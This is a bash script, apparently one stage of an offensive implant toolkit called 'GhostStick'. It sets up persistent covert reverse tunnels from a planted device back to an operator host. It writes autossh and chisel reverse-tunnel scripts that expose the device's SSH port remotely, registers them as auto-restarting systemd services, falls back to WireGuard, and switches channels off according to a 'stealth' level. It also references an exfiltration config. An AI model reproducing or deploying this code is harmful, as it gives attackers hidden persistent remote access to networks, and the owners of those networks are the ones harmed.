#!/usr/bin/env bash
echo "[80] Pivot Engine — Multi-Path Adaptive Tunneling"

set -euo pipefail

GS="/opt/ghoststick"
STATE="$GS/state"
PIVOT_DIR="$GS/pivot"
PROFILE_FILE="$GS/profile.final"
UPSTREAM="$GS/upstream.json"
PIVCFG="$GS/pivot.env"
# shellcheck disable=SC2034
EXFILCFG="$GS/exfil.cfg"

mkdir -p "$STATE" "$PIVOT_DIR"

###############################################################
# 0. Resume-safe
###############################################################
if [ -f "$STATE/pivot.done" ]; then
    echo "[80] Pivot already configured."
    exit 0
fi
touch "$STATE/pivot.start"

###############################################################
# 1. Load operator pivot environment
###############################################################
PIVOT_USER="operator"
PIVOT_HOST=""
PIVOT_PORT=22
PIVOT_ENABLE="true"

AUTO_MODE="auto"         # auto | force-autossh | force-chisel | force-wg
STEALTH_LEVEL="medium"   # high = suppress noisy channels

# shellcheck disable=SC1090
[ -f "$PIVCFG" ] && source "$PIVCFG"

###############################################################
# 2. Load dynamic profile
###############################################################
HOST_OS="secure"
[ -f "$PROFILE_FILE" ] && HOST_OS=$(tr -d ' \t' < "$PROFILE_FILE")

###############################################################
# 3. Load upstream network state
###############################################################
NETOK="false"
if [ -f "$UPSTREAM" ]; then
    NETOK=$(jq -r '.internet // "false"' "$UPSTREAM" 2>/dev/null || echo "false")
fi

###############################################################
# 4. Stealth rule enforcement
###############################################################
DISABLE_SSH="false"
DISABLE_CHISEL="false"
DISABLE_WG="false"

case "$HOST_OS" in
    secure)
        DISABLE_SSH="true"
        DISABLE_CHISEL="true"
        ;;
esac

if [ "$NETOK" = "false" ]; then
    DISABLE_SSH="true"
    DISABLE_CHISEL="true"
    DISABLE_WG="true"
fi

if [ "$STEALTH_LEVEL" = "high" ]; then
    DISABLE_SSH="true"
    DISABLE_CHISEL="true"
fi

###############################################################
# 5. Global pivot disable
###############################################################
if [ "$PIVOT_ENABLE" != "true" ]; then
    echo "[80] Pivoting disabled by operator."
    touch "$STATE/pivot.done"
    exit 0
fi

###############################################################
# 6. Validate operator input
###############################################################
if [ -z "$PIVOT_HOST" ]; then
    echo "[80] WARNING: No upstream host defined. Pivot disabled."
    DISABLE_SSH="true"
    DISABLE_CHISEL="true"
fi

###############################################################
# 7. Build AutoSSH reverse tunnel
###############################################################
cat > "$PIVOT_DIR/autossh.sh" <<EOF
#!/bin/bash
export AUTOSSH_GATETIME=0
export AUTOSSH_PORT=0
exec autossh -M 0 -N -R 9001:localhost:22 -p "$PIVOT_PORT" "$PIVOT_USER@$PIVOT_HOST"
EOF
chmod +x "$PIVOT_DIR/autossh.sh"

cat > /etc/systemd/system/pivot-autossh.service <<EOF
[Unit]
Description=GhostStick Reverse SSH Tunnel
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$PIVOT_DIR/autossh.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

###############################################################
# 8. Build Chisel reverse tunnel
###############################################################
cat > "$PIVOT_DIR/chisel.sh" <<EOF
#!/bin/bash
exec /usr/local/bin/chisel client "$PIVOT_HOST:8000" --reverse R:9002:localhost:22
EOF
chmod +x "$PIVOT_DIR/chisel.sh"

cat > /etc/systemd/system/pivot-chisel.service <<EOF
[Unit]
Description=GhostStick Chisel Reverse Tunnel
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=$PIVOT_DIR/chisel.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

###############################################################
# 9. WireGuard handling
###############################################################
if [ -f "/etc/wireguard/wg0.conf" ]; then
    WG_AVAILABLE="true"
else
    WG_AVAILABLE="false"
fi

###############################################################
# 10. Decision logic
###############################################################
ENABLE_AUTOSSH="false"
ENABLE_CHISEL="false"
ENABLE_WG="false"

case "$AUTO_MODE" in
    force-autossh) ENABLE_AUTOSSH="true" ;;
    force-chisel)  ENABLE_CHISEL="true" ;;
    force-wg)      ENABLE_WG="true" ;;
    auto)
        if [ "$WG_AVAILABLE" = "true" ] && [ "$DISABLE_WG" = "false" ]; then
            ENABLE_WG="true"
        elif [ "$DISABLE_SSH" = "false" ]; then
            ENABLE_AUTOSSH="true"
        elif [ "$DISABLE_CHISEL" = "false" ]; then
            ENABLE_CHISEL="true"
        fi
        ;;
esac

###############################################################
# 11. Apply disable flags
###############################################################
[ "$DISABLE_SSH" = "true" ]    && ENABLE_AUTOSSH="false"
[ "$DISABLE_CHISEL" = "true" ] && ENABLE_CHISEL="false"
[ "$DISABLE_WG" = "true" ]     && ENABLE_WG="false"

###############################################################
# 12. Deactivate all tunnels (clean slate)
###############################################################
systemctl disable pivot-autossh.service >/dev/null 2>&1 || true
systemctl disable pivot-chisel.service  >/dev/null 2>&1 || true
systemctl disable wg-quick@wg0.service  >/dev/null 2>&1 || true

###############################################################
# 13. Activate chosen pivot
###############################################################
if [ "$ENABLE_AUTOSSH" = "true" ]; then
    echo "[80] Activating AutoSSH pivot"
    systemctl enable pivot-autossh.service >/dev/null 2>&1
fi

if [ "$ENABLE_CHISEL" = "true" ]; then
    echo "[80] Activating Chisel pivot"
    systemctl enable pivot-chisel.service >/dev/null 2>&1
fi

if [ "$ENABLE_WG" = "true" ]; then
    echo "[80] Activating WireGuard"
    systemctl enable wg-quick@wg0 >/dev/null 2>&1
fi

###############################################################
# 14. Finalize
###############################################################
touch "$STATE/pivot.done"
echo "[80] Pivot Engine configured."
